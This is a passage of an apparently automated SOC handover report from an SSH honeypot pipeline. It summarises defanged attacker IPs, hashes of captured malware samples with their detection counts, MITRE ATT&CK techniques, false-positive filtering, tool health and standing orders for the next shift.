| `60.245.123[.]145` | 1 | 2026-03-21 00:08 | 2026-03-21 00:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `65.20.191[.]231` | 1 | 2026-03-21 00:43 | 2026-03-21 00:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.144.158[.]62` | 1 | 2026-03-21 06:08 | 2026-03-21 06:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 9/100 | 🟢 LOW | **25/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `187.49.63[.]41` | BR | SCM EVOLUTT CONNECT LTDA | **100** ⚠️ | 16 |
| `171.233.91[.]172` | VN | Viettel Group | **100** ⚠️ | 1 |
| `81.90.25[.]79` | DE | Frankfurt, Germany | **100** ⚠️ | 0 |
| `47.243.46[.]164` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 1 |
| `218.26.205[.]154` | CN | Jinzhong ZQ-WANGBA netbar | **100** ⚠️ | 44 |
| `223.197.145[.]126` | HK | HKT Limited | **100** ⚠️ | 5 |
| `49.124.151[.]11` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 15 |
| `182.227.214[.]33` | KR | LG POWERCOMM | **100** ⚠️ | 41 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `223.123.38[.]39` | PK | CMPak Limited | **100** ⚠️ | 28 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 220 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 102 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 96 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |

---

## 🔕 False Positive Summary (71 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 11 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 50 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 313 cases |
| Tool 34  | Credential Extractor        | ✅ 198 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 15 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 88 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 71 filtered (22.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 94 priority case(s) shown individually · 44 recon entry/entries in table (12 group(s) consolidating 116 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-21T06:40:13Z_
